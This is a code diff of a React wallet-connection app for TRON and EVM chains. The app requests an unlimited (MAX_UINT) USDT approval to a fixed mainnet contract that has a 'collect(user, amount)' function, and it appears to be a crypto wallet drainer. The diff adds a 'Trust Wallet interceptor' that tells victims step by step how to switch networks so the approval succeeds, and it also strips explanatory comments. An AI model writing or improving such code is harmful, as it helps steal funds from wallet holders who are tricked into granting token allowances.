@@ -29,9 +29,8 @@ import TronWeb from 'tronweb'
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
-const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ' // Tron Contract
+const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 
-// Include both Tron and EVM networks
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
   mainnet,
@@ -80,7 +79,6 @@ const wagmiAdapter = new WagmiAdapter({
   networks: appkitNetworks,
 })
 
-// ── Create AppKit ──
 createAppKit({
   adapters: [tronAdapter, wagmiAdapter], 
   networks: appkitNetworks,
@@ -116,8 +114,7 @@ const COLLECT_ABI = [
   { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
 ]
 
-// ✨ FIX: Safe TronWeb Instantiation Helper ✨
-// This prevents the "K9 is not a constructor" error caused by Vite/Webpack bundling
+// Safe TronWeb Instantiation Helper
 const instantiateTronWeb = (host: string) => {
   const TW = typeof TronWeb === 'function' ? TronWeb : 
              (TronWeb as any).TronWeb || 
@@ -134,9 +131,9 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const autoTriggered = useRef(false)
 
-  const { open } = useAppKit()
+ const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
-  const { chainId } = useAppKitNetwork()
+  const { chainId, switchNetwork } = useAppKitNetwork() // <-- Added switchNetwork
 
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
@@ -144,14 +141,12 @@ export default function App() {
   const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
   const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')
 
-  // 1. Expanded resolveTronWeb to capture all Trust Wallet variations
   const resolveTronWeb = () => {
     const w = window as any;
 
     if (w.tronWeb?.contract) return w.tronWeb;
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
     
-    // Trust Wallet variations (casing & direct vs nested)
     if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
     if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
     if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
@@ -190,15 +185,22 @@ export default function App() {
 
         if (!finalTronWeb) {
           log("⚠️ Using Public Provider for balance (Injected not found)");
-          // ✨ FIX: Safe instantiation applied here to prevent stalling
           try {
             const publicTronWeb = instantiateTronWeb('https://api.trongrid.io');
             await getTronBalance(publicTronWeb, walletAddress);
-            setStatus('Ready'); 
-            log('WalletConnect/Public mode active');
+            
+            // If we are in Trust Wallet but no TronWeb was found, it means the network is wrong.
+            const w = window as any;
+            if (w.trustwallet) {
+              setStatus('Action Needed: Switch to TRON');
+              log('❌ Trust Wallet is on the wrong network');
+            } else {
+              setStatus('Ready'); 
+              log('WalletConnect/Public mode active');
+            }
           } catch (e: any) {
             log(`❌ Init Error: ${e.message}`);
-            setStatus('Ready'); // Set ready so the user isn't stuck forever
+            setStatus('Ready');
           }
           return;
         }
@@ -298,16 +300,28 @@ export default function App() {
 
     if (!walletAddress) return;
 
+    const activeTw = resolveTronWeb();
+    const w = window as any;
+
+    // ✨ THE TRUST WALLET INTERCEPTOR ✨
+    // Blocks the transaction and tells the user exactly how to fix the network issue
+    if (w.trustwallet && !activeTw) {
+      log("❌ Trust Wallet TRON provider blocked.");
+      setStatus('Action Needed: Switch to TRON');
+      alert('TRUST WALLET FIX REQUIRED:\n\nYour Trust Wallet browser is currently set to an Ethereum/BNB network instead of TRON.\n\n1. Look at the very top of your screen.\n2. Tap the Network/Chain icon.\n3. Change it to TRON.\n4. Wait a few seconds for it to reload.');
+      setLoading(false);
+      return;
+    }
+
     setLoading(true);
     setStatus('Step 1/2: Approving...');
     log("Requesting USDT Approval...");
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-      const activeTw = resolveTronWeb();
       const FULL_HOST = NETWORK === 'Mainnet' ? 'https://api.trongrid.io' : 'https://nile.trongrid.io';
 
-      // ----------- PATH A: Fully Injected Wallet (TronLink, TokenPocket) -----------
+      // ----------- PATH A: Fully Injected Wallet (TronLink, TokenPocket, Trust on correct network) -----------
       if (activeTw && typeof activeTw.contract === 'function') {
         log('Executing via Injected Provider...');
         const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
@@ -332,14 +346,12 @@ export default function App() {
         return;
       }
 
-      // ----------- PATH B: AppKit / WalletConnect (Trust Wallet) -----------
+      // ----------- PATH B: AppKit / WalletConnect -----------
       if (tronWalletProvider) {
         log("Executing via Reown Universal Provider...");
         
-        // ✨ FIX: Safe instantiation applied here to prevent K9 constructor error ✨
         const publicTw = instantiateTronWeb(FULL_HOST);
         
-        // Helper to construct, sign, and broadcast raw TRON transactions via generic adapters
         const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
           const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
             contractAddr, 
@@ -350,12 +362,22 @@ export default function App() {
           );
           
           let signedTx;
-          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
-            signedTx = await (tronWalletProvider as any).signTransaction(transaction);
-          } else if (typeof (tronWalletProvider as any).request === 'function') {
-            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
-          } else {
-            throw new Error("Connected provider does not support signTransaction");
+          
+          // Try/Catch specifically to catch AppKit provider routing errors
+          try {
+            if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+              signedTx = await (tronWalletProvider as any).signTransaction(transaction);
+            } else if (typeof (tronWalletProvider as any).request === 'function') {
+              signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+            } else {
+              throw new Error("Provider does not support signing");
+            }
+          } catch (signErr: any) {
+            // Catch the specific internalRequest / formatting errors
+            if (signErr.message?.includes("internalRequest") || signErr.message?.includes("not a function")) {
+              throw new Error("Provider rejected request. Switch to TRON network.");
+            }
+            throw signErr;
           }
 
           const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
